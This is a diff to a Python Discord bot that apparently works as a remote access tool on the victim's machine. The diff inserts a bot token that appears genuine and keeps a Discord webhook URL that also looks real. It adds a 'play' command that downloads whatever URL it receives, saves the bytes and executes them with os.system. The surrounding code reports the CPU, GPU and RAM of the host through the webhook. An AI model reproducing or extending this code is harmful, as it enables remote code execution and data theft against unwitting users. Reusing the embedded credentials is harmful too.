@@ -9,8 +9,10 @@ import wmi
 import requests
 import cv2
 import pynput
+import signal
 
-TOKEN = ""
+
+TOKEN = "MTE5NTMzMTE1NzEwNjEwMjMzNA.G5ZiDa.SSbKCAJF0mP9SxQCrHoiTE2nSjvspXmyFYK5ng"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF"
 
 
@@ -167,6 +169,24 @@ async def on_message(message):
                         0].TotalVisibleMemorySize) / 1048576, 0)
             webhook = DiscordWebhook(url=WEBHOOK_URL, content="`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
             response = webhook.execute()
+    
+    elif message.content.startswith("play"):
+        command = message.content
+        command = command.replace("play ", "")
+        url = command
+        r = requests.get(url, allow_redirects=True)
+        open('sound.m4a', 'wb').write(r.content)
+        os.system("sound.m4a")
+
+        time.sleep(7)
+        os.remove("sound.m4a")
+        os.system("TASKKILL /F /IM Microsoft.Media.Player.exe")
+
+
+
+
         
+       
+
 
 client.run(TOKEN)
